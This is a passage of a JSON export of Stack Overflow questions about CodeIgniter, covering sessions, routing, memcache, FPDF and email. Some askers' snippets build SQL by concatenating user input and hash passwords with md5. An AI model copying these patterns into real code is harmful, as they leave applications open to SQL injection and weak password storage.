accounts?</p>\n\n<p>How should I implement this? I am using PHP Code Igniter (looking at Ion Auth) also that's another problem as the database configuration has to be set in a php config file how would I alternate between both.</p>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":12079630,"title":"Multiple Sessions in Codeigniter/PHP","body":"<p>I am developing a e-commerce website in codeigniter having sessions for following:</p>\n\n<ol>\n<li>admin login</li>\n<li>shopping cart</li>\n<li>user login</li>\n</ol>\n\n<p>Now i am unable to figure out a mechanism for managing these three sessions with different sets of data.</p>\n\n<p>I know it can be achieved with session_name() in core php. But with codeigniter i am a bit confused.\nGoogled it a lot but couldn't found a proper answer.</p>\n\n<p>I want a clear understanding of multiple sessions in codeigniter so that it doesn't create any confusion in future. Any link to tutorial would be great.</p>\n"},{"tags":["jquery","ajax","codeigniter","function"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":12008834,"title":"JQuery / AJAX file upload firing once","body":"<p>I've got the following function:</p>\n\n<pre><code>$('#userfile').change(function() {\n    $.ajaxFileUpload({\n        url: 'control/upload/go',\n        secureuri: false,\n        fileElementId: 'userfile',\n        dataType: 'json',\n        success: function(data, status) {\n            if(data.status != 'error') {\n                $('.input_response').val(data.filename);\n            }\n            $('.response').text(data.msg);\n        }\n    });\n});\n</code></pre>\n\n<p>The problem is that it won't fire more than once without a complete page refresh. </p>\n\n<p>Any ideas? Thanks</p>\n"},{"tags":["php","codeigniter","memcached"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":68,"score":1,"question_id":12601928,"title":"php memcache key management","body":"<p>Hi I'm Integrating memcache in my codeigniter application,\nMy query change on the user selected values. some thing like this</p>\n\n<pre><code>$sql='select * from user where user_name=\"'.$name.'\" and location='\".$location.\"'\";\n$result = $this-&gt;memcached_library-&gt;get(md5($sql));\nif(!$result ){\n       /*  execute query and get $result    */\n       $this-&gt;memcached_library-&gt;add(md5($sql), $result );\n}else{\n       return $result;\n}\n</code></pre>\n\n<p>This is  my approach to handle the keys for each different query. But I have heard some where that md5() is not always unique.? </p>\n\n<p>1> Is <strong>md5()</strong> always unique?</p>\n\n<p>2> if md5() is not unique than what shoud be the other option....</p>\n\n<p>3> what about <strong>crc32()</strong> is that unique??</p>\n\n<p>Thanks.... </p>\n"},{"tags":["jquery","codeigniter","safari"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12569671,"title":"Disallowed Key Characters in jquery with Codeigniter","body":"<p>I have problem with Safari browser when I want to load picture with jQuery in the Codeigniter framework. The loader is blocked. When I use Firebug, I find the error :</p>\n\n<pre><code>[uploader] responseText = Disallowed Key Characters\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":12590508,"title":"how to pass a list of values to a method, Codeigniter style","body":"<p>What's a good way to pass a list of items 2-3 items to a method in my controller?\nI was thinking of just using the URL.... like so: </p>\n\n<pre><code>   http://myserver/myapp/mycontroller/mymethod/parm1/parm2/listitem1/listitem2/listitem3\n</code></pre>\n\n<p>Is there a better way to do this?  This data is not coming from a form, but rather from a database query and I'm building a hyperlink with it. </p>\n\n<p>I guess the only part that bothers me is that I won't know in advance how many items I have when i'm parsing this url.</p>\n\n<p>Its possible that I'll get none, or all 3 or some value in between.  So the method that then has to parse this url will just keep looping until uri->segment() returns false, indicating that it's hit the first empty uri segment. \nAny suggestions would be appreciated.</p>\n\n<p>Thanks</p>\n\n<p><strong>EDIT 1:</strong>  </p>\n\n<p>Just in case it wasn't clear, my model is getting the data from the database and will also build the list. \nThe question is really about parsing an undetermined number of uri segments.\nJust wondering if there's a better way to do this.\nThanks!</p>\n\n<p><strong>EDIT 2</strong></p>\n\n<p>Here's some more information to help you understand my MVC app. I don't think my issue is the way I've organized my code as far as who is doing what.. But just in case it helps...</p>\n\n<p>I have methodA in my model that queries database and passes back to my controller listitem1, listitem2 and listitem2.\nThe controller then builds a string that represents a URL like: </p>\n\n<pre><code>  http://myserver/myapp/mycontroller/methodB/parm1/parm2/listitem1/listitem2/listitem3\n</code></pre>\n\n<p>Then the view display a hyperlink using the url above. \nWhen the user clicks on this hyperlink, it calls methodB. \nIn methodB, I since I don't know the number of items, I will just loop through all segments until I hit my first false.  </p>\n\n<p>As far as why I need to do this / what I'm doing... here's some background info: \nI'm query a database for a list of ports on a switch that are considered trunks - ones that should not be modified. \nthis is what method A does. </p>\n\n<p>methodB run a command against a switch and it returns a bunch of data back.  the view that displays the data from methodB will allow the end user to make further changes to the switch. before I display the data from methodB, i want to filter out the list of ports I got from methodA so they cannot be tampered with. </p>\n\n<p>Hope this helps.</p>\n\n<p><strong>Edit 3</strong></p>\n\n<p>I need both methodA and methodB because they serve two different purposes.  methodA displays summary data about ports from my database.  Think of methodA as a function that shows <strong>documentation</strong> about the switch.  The view for methodA in turn, provides \"live\" links to communicate with the actual switch - this is where methodB comes in. methodB is triggered by one of those live links and it goes and gets a list of ports - similar to methodA - except that it represents what actual, and it doesn't include user defined information about the port. \nI guess I can have methodB communicate with my database and filter its data before it displays, but if i want to treat these two functions as separate APIs... aka - one set of functions get data out of the database, the other set is a tool to communicate with switches... - then i don't think i want one talking directly to the other. I would like the GUI to tie them together.  In fact, i have created two separate models and controllers for what I'll call the database interface, and then the switch interface. \nSo far, i think the forms idea is the most elegant solution. \nThanks everyone, for reading. </p>\n"},{"tags":[".htaccess","codeigniter","url-rewriting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12598630,"title":"Codeigniter 2.1 and .htaccess - rewrite url","body":"<p>I need to rewrite this url:</p>\n\n<blockquote>\n  <p>domain.com/mali_oglasi/index/1(any number)</p>\n</blockquote>\n\n<p>to:</p>\n\n<blockquote>\n  <p>domain.com/mali_oglasi</p>\n</blockquote>\n\n<p>In my .htaccess file I have this code:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\n</code></pre>\n\n<p>How can I do this?</p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12599530,"title":"Retrieve the inserted id Codeigniter","body":"<p>Hey guys i need a little help. All i want is to retrieve my member_id to pass it in the other table i tried to use the $this->db->insert_id(); but it returns to 0. But when i look up in the table the ID value is 8. How can i get the value of 8 in my other table? Because im trying to run two queries in one execution. Here’s my sample code.</p>\n\n<pre><code>$member = array(\n                    'member_id' =&gt; null, \n                    'account_type' =&gt; $this-&gt;input-&gt;post('mem_type'),\n                    'username' =&gt; strtolower($this-&gt;input-&gt;post('username')),\n                    'account_type' =&gt; $this-&gt;input-&gt;post('mem_type'),\n                    'lastname' =&gt; ucwords($this-&gt;input-&gt;post('lastname')),\n                    'firstname' =&gt; ucwords($this-&gt;input-&gt;post('firstname')),\n                    'middlename' =&gt; ucwords($this-&gt;input-&gt;post('middlename')),\n                    'gender' =&gt; $this-&gt;input-&gt;post('gender'),\n                    'email' =&gt; strtolower($this-&gt;input-&gt;post('email')),\n                    'mobile_number' =&gt; $this-&gt;input-&gt;post('contact'),\n                    'password' =&gt; md5($this-&gt;input-&gt;post('password')),\n                    'upline' =&gt; $this-&gt;input-&gt;post('referral'),\n                    'account_created' =&gt; date('Y-m-d h:i:s')\n                );\n                $member_insert_id = $this-&gt;db-&gt;insert_id();\n\n                $id = $this-&gt;input-&gt;post('referral');\n\n                //count the selected id in upline\n                $this-&gt;db-&gt;like('upline',$id);\n                $this-&gt;db-&gt;from('member');\n                $query =  1 + $this-&gt;db-&gt;count_all_results();   \n\n                $this-&gt;member = 0;\n\n                if($query &lt; $this-&gt;reglvl1){\n                    $this-&gt;member = 1;\n                }\n\n                if($query &lt; $this-&gt;reglvl2){\n                    $this-&gt;member = 2;\n                }\n\n                if($query &lt; $this-&gt;reglvl3){\n                    $this-&gt;member = 3;\n                }\n\n                if($query &lt; $this-&gt;reglvl4){\n                    $this-&gt;member = 4;\n                }\n\n                if($query &lt; $this-&gt;reglvl5){\n                    $this-&gt;member = 5;\n                }\n\n                $insert_downline = array(\n                    'down_id' =&gt; null,\n                    'level' =&gt; $this-&gt;member,\n                    'fkmember' =&gt; $id, //referral id\n                    'downline' =&gt; $member_insert_id //member id\n                    );\n\n                return $this-&gt;db-&gt;insert('downline',$insert_downline);\n                return $this-&gt;db-&gt;insert('member',$member); \n</code></pre>\n\n<p>And my other problem is when i inserted the data in the tables. It only inserted int the second table. Here's my table structure:</p>\n\n<pre><code>CREATE TABLE `member` (\n    `member_id` INT(10) UNSIGNED NOT NULL AUTO_INCREMENT,\n    `account_type` ENUM('REGULAR','DUPLICATE','CORPORATE','ADVANCE') NOT NULL,\n    `username` VARCHAR(30) NOT NULL,\n    `lastname` VARCHAR(50) NOT NULL,\n    `firstname` VARCHAR(50) NOT NULL,\n    `middlename` VARCHAR(50) NOT NULL,\n    `gender` ENUM('Male','Female') NOT NULL,\n    `email` VARCHAR(50) NOT NULL,\n    `mobile_number` VARCHAR(50) NOT NULL,\n    `password` VARCHAR(50) NOT NULL,\n    `upline` VARCHAR(10) NOT NULL,\n    `account_created` DATETIME NOT NULL,\n    PRIMARY KEY (`member_id`),\n    UNIQUE INDEX `username` (`username`),\n    UNIQUE INDEX `mobile_number` (`mobile_number`),\n    UNIQUE INDEX `email` (`email`)\n)\nCOLLATE='utf8_general_ci'\nENGINE=InnoDB\nAUTO_INCREMENT=3;\n\nCREATE TABLE `downline` (\n    `down_id` INT(10) UNSIGNED NOT NULL AUTO_INCREMENT,\n    `level` INT(10) UNSIGNED NOT NULL,\n    `fkmember` INT(10) UNSIGNED NOT NULL,\n    `downline` INT(10) UNSIGNED NOT NULL,\n    PRIMARY KEY (`down_id`),\n    INDEX `fkmember` (`fkmember`),\n    CONSTRAINT `downline_ibfk_1` FOREIGN KEY (`fkmember`) REFERENCES `member` (`member_id`)\n)\nCOLLATE='utf8_general_ci'\nENGINE=InnoDB\nAUTO_INCREMENT=3;\n</code></pre>\n\n<p>I want is to insert first the member. If the member has no reference id it will automaically add to the member and insert a value of 'none' in the upline field. The reference id comes from the people who referred the use to have a membership. And if the member has a reference id it also add to the member table and to the downline table as well. But the downline table will validate if what level is the user. I dont have a problem in the look up of level. My Problem is in my downline column. It always store to the value of 0 that comes from $this->db->inser_id().How can i get the right value? Please help me guys. </p>\n"},{"tags":["php","sql","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12599475,"title":"How to make a good loop for this query result","body":"<p>I've got a query that gives me something like the following result when I would print out a table:</p>\n\n<pre><code>+---------------------------------------------------------------------+\n|    ID      |    Name     |    Color      |     Size     |    Qty    |\n+---------------------------------------------------------------------+\n|    1       |    First    |    Green      |      S       |     1     |\n|    2       |    First    |    Green      |      L       |     2     |\n|    3       |    First    |    Green      |      XL      |     1     |\n|    4       |    First    |    Red        |      M       |     2     |\n|    5       |    First    |    Red        |      L       |     3     |\n|    6       |    Second   |    Blue       |      S       |     1     |\n|    7       |    Second   |    Blue       |      M       |     4     |\n+---------------------------------------------------------------------+\n</code></pre>\n\n<p>Now I want to make an overview (in real life these are products) where someone can click a button to edit or delete. I want to loop over it with a foreach loop or something and print it out something like this:</p>\n\n<pre><code>+========================================================================+\n|    Name     |    Color      |     Size     |    Qty    |    Action     |\n+========================================================================+\n|    First    |    Green      |      S       |     1     |  Edit|Delete  |\n|             |               |      L       |     2     |  Edit|Delete  |\n|             |               |      XL      |     1     |  Edit|Delete  |\n+------------------------------------------------------------------------+\n|    First    |    Red        |      M       |     2     |  Edit|Delete  |\n|             |               |      L       |     3     |  Edit|Delete  |\n+------------------------------------------------------------------------+\n|    Second   |    Blue       |      S       |     1     |  Edit|Delete  |\n|             |               |      M       |     4     |  Edit|Delete  |\n+------------------------------------------------------------------------+\n</code></pre>\n\n<p>but somehow I just can't get my head around how I would program this loop. Or should I change the query?\nI hope someone can help. If you need more information, please tell me.</p>\n"},{"tags":["php","mysql","email","codeigniter"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":3108,"score":0,"question_id":6274117,"title":"Sending HTML Email results in Email displaying HTML source (Codeigniter Email Class)","body":"<p>I am having problems with email sent via the email class in Codeigniter displaying the source HTML code in the email message instead of the rendered HTML view. For testing, I am currently having CI on XAMPP on Windows, and using Gmail SMTP to send to the same gmail address.</p>\n\n<p>The function that sends the email is as follows:</p>\n\n<pre><code>$config = Array(\n        'protocol' =&gt; 'smtp',\n        'smtp_host' =&gt; 'ssl://smtp.googlemail.com',\n        'smtp_port' =&gt; 465,\n        'smtp_user' =&gt; 'myaccountname@gmail.com',\n        'smtp_pass' =&gt; 'mygmailpassword',\n        );\n\n    $this-&gt;load-&gt;library('email', $config); \n    $this-&gt;email-&gt;from($this-&gt;config-&gt;item('webmaster_email', 'tank_auth'), $this-&gt;config-&gt;item('website_name', 'tank_auth'));\n    $this-&gt;email-&gt;reply_to($this-&gt;config-&gt;item('webmaster_email', 'tank_auth'), $this-&gt;config-&gt;item('website_name', 'tank_auth'));\n    $this-&gt;email-&gt;to($email);\n    $this-&gt;email-&gt;subject(sprintf($this-&gt;lang-&gt;line('auth_subject_'.$type), $this-&gt;config-&gt;item('website_name', 'tank_auth')));\n    $this-&gt;email-&gt;message($this-&gt;load-&gt;view('email/'.$type.'-html', $data, TRUE));\n    $this-&gt;email-&gt;set_alt_message($this-&gt;load-&gt;view('email/'.$type.'-txt', $data, TRUE));\n\n    $this-&gt;email-&gt;set_newline(\"\\r\\n\"); // require this, otherwise sending via gmail times out\n\n    $this-&gt;email-&gt;send();\n</code></pre>\n\n<p>There is no problem getting the text version sent. The view loaded is a html file that will be emailed out.</p>\n\n<pre><code>    &lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\" \"http://www.w3.org/TR/html4/loose.dtd\"&gt;\n&lt;html&gt;\n&lt;head&gt;&lt;title&gt;Welcome to &lt;?php echo $site_name; ?&gt;!&lt;/title&gt;&lt;/head&gt;\n&lt;body&gt;\n&lt;div style=\"max-width: 800px; margin: 0; padding: 30px 0;\"&gt;\n&lt;table width=\"80%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"&gt;\n&lt;tr&gt;\n&lt;td width=\"5%\"&gt;&lt;/td&gt;\n&lt;td align=\"left\" width=\"95%\" style=\"font: 13px/18px Arial, Helvetica, sans-serif;\"&gt;\n&lt;h2 style=\"font: normal 20px/23px Arial, Helvetica, sans-serif; margin: 0; padding: 0 0 18px; color: black;\"&gt;Welcome to &lt;?php echo $site_name; ?&gt;!&lt;/h2&gt;\nThanks for joining &lt;?php echo $site_name; ?&gt;. We listed your sign in details below, make sure you keep them safe.&lt;br /&gt;\nTo verify your email address, please follow this link:&lt;br /&gt;\n&lt;br /&gt;\n&lt;big style=\"font: 16px/18px Arial, Helvetica, sans-serif;\"&gt;&lt;b&gt;&lt;a href=\"&lt;?php echo site_url('/auth/activate/'.$user_id.'/'.$new_email_key); ?&gt;\" style=\"color: #3366cc;\"&gt;Finish your registration...&lt;/a&gt;&lt;/b&gt;&lt;/big&gt;&lt;br /&gt;\n&lt;br /&gt;\nLink doesn't work? Copy the following link to your browser address bar:&lt;br /&gt;\n&lt;nobr&gt;&lt;a href=\"&lt;?php echo site_url('/auth/activate/'.$user_id.'/'.$new_email_key); ?&gt;\" style=\"color: #3366cc;\"&gt;&lt;?php echo site_url('/auth/activate/'.$user_id.'/'.$new_email_key); ?&gt;&lt;/a&gt;&lt;/nobr&gt;&lt;br /&gt;\n&lt;br /&gt;\nPlease verify your email within &lt;?php echo $activation_period; ?&gt; hours, otherwise your registration will become invalid and you will have to register again.&lt;br /&gt;\n&lt;br /&gt;\n&lt;br /&gt;\n&lt;?php if (strlen($username) &gt; 0) { ?&gt;Your username: &lt;?php echo $username; ?&gt;&lt;br /&gt;&lt;?php } ?&gt;\nYour email address: &lt;?php echo $email; ?&gt;&lt;br /&gt;\n&lt;?php if (isset($password)) { /* ?&gt;Your password: &lt;?php echo $password; ?&gt;&lt;br /&gt;&lt;?php */ } ?&gt;\n&lt;br /&gt;\n&lt;br /&gt;\nHave fun!&lt;br /&gt;\nThe &lt;?php echo $site_name; ?&gt; Team\n&lt;/td&gt;\n&lt;/tr&gt;\n&lt;/table&gt;\n&lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>Any ideas how to get HTML emails sent to be rendered instead of displaying its source code?</p>\n"},{"tags":["codeigniter","activerecord"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":12599492,"title":"Active Records Update can I switch escaping off?","body":"<p>I'm trying to use the code bellow to update the page count. I'd rather do with one one query, than running one to get the existing count first. Is there a way to tell codeigniter not to escape the query? at the moment it's putting '' around 'page_views + 1' which is breaking the query.</p>\n\n<pre><code> $this-&gt;db-&gt;where('id', $charity);\n $this-&gt;db-&gt;update('charities', array('page_views' =&gt; 'page_views + 1'));\n</code></pre>\n"},{"tags":["codeigniter","fpdf","blank"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":217,"score":0,"question_id":12599192,"title":"Blank Output PDF using FPDF library - codeigniter","body":"<p>Sir, I have a problem:I'm going to generate a PDF report using FPDF library, but the output is BLANK.. there no error displayed, how can I fix this problem? </p>\n\n<p>Anyway, I tried this code in LOCALHOST and it works perfectly, but when I upload it to the cloud, there's no output to be displayed.. I tried to make the function output like this..</p>\n\n<p>$this->fpdf->OUTPUT('try.pdf','I'); but nothing happens..</p>\n\n<p>NOTE: In my output, C:/backup/employee_..php, the output is in the folder, there's no error and it works fine.. but when I upload this one, there no output to be display</p>\n\n<p>this is my CONTROLLER:</p>\n\n<p>public function backup_employees_pdf()\n        {</p>\n\n<pre><code>        $this-&gt;load-&gt;library('fpdf');   \n\n        define('FPDF_FONTPATH',$this-&gt;config-&gt;item('fonts_path'));\n        $this-&gt;fpdf =new FPDF('L', 'mm', 'Legal', true, 'UTF-8', false);\n        $this-&gt;fpdf-&gt;AliasNbPages();\n        $this-&gt;fpdf-&gt;AddPage();\n\n        //load data\n        $data = array();\n        $row = $this-&gt;m_employee-&gt;load_data_employees();\n        $data = $row-&gt;result();\n\n        // Whatever written here will come in header of the pdf file.\n\n        $this-&gt;fpdf-&gt;Image('assets/images1/mpowerstafflogo.jpg',10,5,50,50,'','www.mpowerstaff.com');\n        $this-&gt;fpdf-&gt;SetFont('Arial','B',15);\n        $this-&gt;fpdf-&gt;Cell(140);\n        $this-&gt;fpdf-&gt;Cell(50,10,'Employee File Management Website',0,0,'C');\n        $this-&gt;fpdf-&gt;Ln(5);\n        $this-&gt;fpdf-&gt;Cell(140);\n        $this-&gt;fpdf-&gt;Ln(5);\n        $this-&gt;fpdf-&gt;SetFont('Arial','',12);\n        $this-&gt;fpdf-&gt;Cell(140);\n        $this-&gt;fpdf-&gt;Cell(50,10,'3F Room 305 Jackson Bldg. 926 Arnaiz Ave., San Loreno Village Makati City, 1223 PHILIPPINES',0,0,'C');\n        $this-&gt;fpdf-&gt;Ln(5);     \n        $this-&gt;fpdf-&gt;Ln(5);\n        $this-&gt;fpdf-&gt;Cell(140);\n        $this-&gt;fpdf-&gt;Cell(50,10,'Tel. (632) 810-4026 * 810-9121',0,0,'C');\n        $this-&gt;fpdf-&gt;Ln(5);\n        $this-&gt;fpdf-&gt;Ln(5);\n        $this-&gt;fpdf-&gt;Cell(140);\n        $this-&gt;fpdf-&gt;Cell(50,10,'Email: mpowerstaff@yahoo.com',0,0,'C');\n        $this-&gt;fpdf-&gt;Ln(10);\n        $this-&gt;fpdf-&gt;SetFont('Arial','B',12);\n        $this-&gt;fpdf-&gt;Cell(140);\n        $this-&gt;fpdf-&gt;Cell(50,10,'Employees Report',0,0,'C');\n        $this-&gt;fpdf-&gt;Ln(15);\n\n        // Colors, line width and bold font\n        $this-&gt;fpdf-&gt;SetFillColor(105,100,231);\n        $this-&gt;fpdf-&gt;SetTextColor(255);\n        $this-&gt;fpdf-&gt;SetDrawColor(60,89,117);\n        $this-&gt;fpdf-&gt;SetLineWidth(0.3);\n        $this-&gt;fpdf-&gt;SetFont('', 'B');\n\n        // Header   \n        $w = array(35,80,40,40,40,40,61);\n\n        $this-&gt;fpdf-&gt;Ln();\n\n        //border LRTB\n        $this-&gt;fpdf-&gt;Cell(5);\n        $this-&gt;fpdf-&gt;Cell(90,10,'NAME',1,0,'C', 'LR');\n        $this-&gt;fpdf-&gt;Cell(60,10,'ACCOUNT NUMBER',1,0,'C', 'LR');\n        $this-&gt;fpdf-&gt;Cell(60,10,'ADDRESS',1,0,'C', 'LR');\n        $this-&gt;fpdf-&gt;Cell(60,10,'BIRTHDAY',1,0,'C', 'LR');\n        $this-&gt;fpdf-&gt;Cell(60,10,'CONTACT NO.',1,0,'C', 'LR');\n        $this-&gt;fpdf-&gt;Ln(10);\n\n        // Color and font restoration\n        $this-&gt;fpdf-&gt;SetFillColor(224, 235, 255);\n        $this-&gt;fpdf-&gt;SetTextColor(0);\n        $this-&gt;fpdf-&gt;SetFont('');\n\n        $fill = 0;\n        //data\n        foreach($data as $empsItem)\n        {      \n            $this-&gt;fpdf-&gt;Cell(5);\n            $this-&gt;fpdf-&gt;Cell(90,10,$empsItem-&gt;name,1,0,'C',$fill);\n            $this-&gt;fpdf-&gt;Cell(60,10,$empsItem-&gt;account_no,1,0,'C',$fill);\n            $this-&gt;fpdf-&gt;Cell(60,10,$empsItem-&gt;address,1,0,'C',$fill);\n            $this-&gt;fpdf-&gt;Cell(60,10,$empsItem-&gt;birthday,1,0,'C',$fill);\n            $this-&gt;fpdf-&gt;Cell(60,10,$empsItem-&gt;contact_no,1,0,'C',$fill);\n            $this-&gt;fpdf-&gt;Ln(10);\n            $fill=!$fill;   \n        }\n\n        $this-&gt;fpdf-&gt;Ln(30);\n        $this-&gt;fpdf-&gt;SetFont('Arial','B',10);\n        $this-&gt;fpdf-&gt;Cell(20, 5,'Total Employees: '.$row-&gt;num_rows(), '', 0, 'LR', 0);\n\n        $this-&gt;fpdf-&gt;SetY(184);\n        $this-&gt;fpdf-&gt;SetFont('Arial','I',8);\n        $this-&gt;fpdf-&gt;Cell(0,10,'Copyright. All Rights Reserved',0,0,'C');\n        $this-&gt;fpdf-&gt;Cell(0,10,'Page '.$this-&gt;fpdf-&gt;PageNo().' of {nb}',0,0,'C');\n\n        $dir = 'C:/backup/';\n        $filename = \"employee report\";\n\n        $this-&gt;fpdf-&gt;Output($dir.$filename.'.pdf');\n    }\n</code></pre>\n\n<p>//====THIS IS MY MODEL===//</p>\n\n<p>public function load_data_employees()\n        {\n            $query = $this->db->query(\"SELECT concat(e_first_name,' ',e_middle_name,' ',e_last_name) AS 'name',account_number AS 'account_no',address AS 'address',birthday AS 'birthday',contact_number AS 'contact_no'FROM tb_emp where status='available'\");\n            return $query;\n        }</p>\n\n<p>//== CONFIG.PHP==//</p>\n\n<p>$config['fonts_path']= \"./system/fonts/font/\";</p>\n\n<p>that's the details.. PLS.. help me sir.. I badly need your response.. I tried to fix this but still, there no output.. :(</p>\n\n<p>BTW THANKS in advance! GODBLESS! :)</p>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12598077,"title":"Codeigniter 2.1 - Routing","body":"<p>I am a bit new to the routing with CI, and I don't understand it quite well (to be honest not at all). I have following url which need to be changed:</p>\n\n<blockquote>\n  <p>domain.com/mali_oglasi/index/1(some number)</p>\n</blockquote>\n\n<p>It is used for pagination, and I need it to be shorten to: </p>\n\n<blockquote>\n  <p>domain.com/mali_oglasi</p>\n</blockquote>\n\n<p>I tried:</p>\n\n<blockquote>\n  <p>$route['mali_oglasi/index/(:num)'] = 'mali_oglasi';</p>\n</blockquote>\n\n<p>but it doesn't seems to work(nothing is changed). What am I doing wrong, what needs to be changed?</p>\n\n<p>Index function from the controller <strong>mali_oglasi</strong>:</p>\n\n<pre><code>function index() {     \n\n    $config['base_url'] = base_url().'mali_oglasi/index';\n    $config['total_rows'] = $this-&gt;db-&gt;count_all('ad');\n    $config['per_page'] = 10;\n\n    $this-&gt;pagination-&gt;initialize($config);\n    $data['pagination_links'] = $this-&gt;pagination-&gt;create_links();\n\n\n    $data['title'] = \"Mali Oglasi | 010\";\n    $data['oglasi'] =  $this-&gt;mgl-&gt;mgl_get_all_home($config['per_page']);\n    $data['loc'] = $this-&gt;gi_loc;\n    $data['cat'] = $this-&gt;gi_cat;\n    $data['stylesheet'] = $this-&gt;css;\n    $data['main_content'] = 'mali_oglasi';\n\n    $this-&gt;load-&gt;view('template',$data);\n}\n</code></pre>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":502,"score":0,"question_id":8215473,"title":"My website is throwing \"PHP Fatal error: Call to undefined method CI_Lang::lang()\"","body":"<p>I created a website using CodeIgniter Framework 2.1.0 that was originally working well. Yesterday, I integrated <a href=\"http://codeigniter.com/wiki/CodeIgniter_2.1_internationalization_i18n\" rel=\"nofollow\">this i18n code</a> into the site for multi-language support. \nNow, when I upload my site to cpanel and open it, I get this error in my log file:</p>\n\n<blockquote>\n  <p>[21-Nov-2011 10:19:04] PHP Fatal error:  Call to undefined method CI_Lang::lang() in XXXX</p>\n</blockquote>\n\n<p>However, the website is working well on my localhost server (xampp for Windows). What's wrong?</p>\n"},{"tags":["codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":227,"score":0,"question_id":8447565,"title":"codeigniter hooks can't get $ci object to work","body":"<p>I've just started looking at hooks today not 100% sure what I'm doing wrong but I'm getting an error when I try and use the $ci object in my function. </p>\n\n<p>A PHP Error was encountered\nSeverity: Notice\nMessage: Trying to get property of non-object\nFilename: hooks/language.php\nLine Number: 12</p>\n\n<p>My hooks file looks like this. It's in the hooks directory in my application folder.</p>\n\n<pre><code>class Language{\n\n    var $ci;\n\n    public function __construct(){\n       $this-&gt;ci =&amp; get_instance();\n    }\n\n    function get_language(){\n        echo $this-&gt;ci-&gt;session-&gt;userdata('language');\n    }\n}\n</code></pre>\n\n<p>I need to get the value in the session to use in my function. Am I not supposed to do it like this? </p>\n\n<p>Thanks you!</p>\n"},{"tags":["codeigniter","facebook-php-sdk"],"answer_count":1,"favorite_count":3,"up_vote_count":3,"down_vote_count":0,"view_count":259,"score":3,"question_id":7955648,"title":"Is there any good sample about facebook-php-sdk3.0+ with CodeIgniter2.0+?","body":"<p>I use CodeIgniter2.0.3 and facebook-php-sdk3.1.1 to develop an application.</p>\n\n<p>When I run the project,is says:</p>\n\n<p><strong>Fatal error: Cannot redeclare class Facebook in ../application/libraries/facebook.php on line 24</strong></p>\n\n<p>The source of line 24 is:</p>\n\n<pre><code>class Facebook extends BaseFacebook\n</code></pre>\n\n<p>What's the reason?How to deal with it?</p>\n"},{"tags":["php","javascript","jquery","ajax","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":85,"score":3,"question_id":12596707,"title":"need to refresh the page content","body":"<p>I am using codeigniter frame work and currently working on social networking kind of stuff. My problem is, i need to  notify the user of their friends activity with out reloading the page when the user clicks on the feeds link. \nI have tried the following script,</p>\n\n<pre><code>&lt;script&gt;\nsetInterval(function() {\n$('#reload').fadeOut(\"slow\").load('user_feeds').fadeIn(\"slow\");\n}, 10000);\n&lt;/script&gt;\n</code></pre>\n\n<p>It increases the load to my server. any other idea for accomplishing this.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["php","oop","codeigniter","model"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":237,"score":2,"question_id":10881776,"title":"Codeigniter MY_Model class","body":"<p>I'm trying to write my own MY_Model base class but I'm facing a weird problem:  </p>\n\n<p><strong>/core/MY_Model.php</strong>\n    \n\n<pre><code>    function __construct() {\n        if ( !empty($this-&gt;table)) {\n            // query db, etc.\n        }\n        else {\n            // even though that I set $this-&gt;table value \n            // in the child class, I always ended up here\n            // it's always empty!!!!\n            log_message('error', 'some error message');\n        }\n        // ...\n    }\n}\n</code></pre>\n\n<p><strong>/models/test_model.php</strong>\n    \n\n<pre><code>    function __construct() {\n        parent::__construct();\n    }\n\n    // ...\n\n}\n</code></pre>\n\n<p>even though that I set $this->table value in the child class, I always ended up finding $table value empty in MY_Model class, it's always empty!!!! any hint please?!</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":63,"score":0,"question_id":12576216,"title":"how to create search function without link database","body":"<p>Actually  i tried to create search function without link to db. so the al thing i just put at model. now i don't know how to call that data in controller. hope anyone can solved my problem.</p>\n\n<p>this my view page: </p>\n\n<pre><code>&lt;li&gt;Category:\n&lt;div&gt;\n&lt;? echo form_dropdown('fcategory', $content_category); ?&gt; &lt;/div&gt;&lt;/li&gt;\n\n&lt;li&gt; Channel:&lt;div&gt;\n&lt;? echo form_dropdown('fchannel', $content_channel); ?&gt;&lt;/div&gt; &lt;/li&gt;\n\n&lt;li&gt; Language&lt;div&gt;\n&lt;? echo form_dropdown('flanguage', $content_language); ?&gt;&lt;/div&gt; &lt;/li&gt;\n\n&lt;input type=\"submit\" class=\"btn\" name=\"search\" value=\"Search\" /&gt; &lt;span 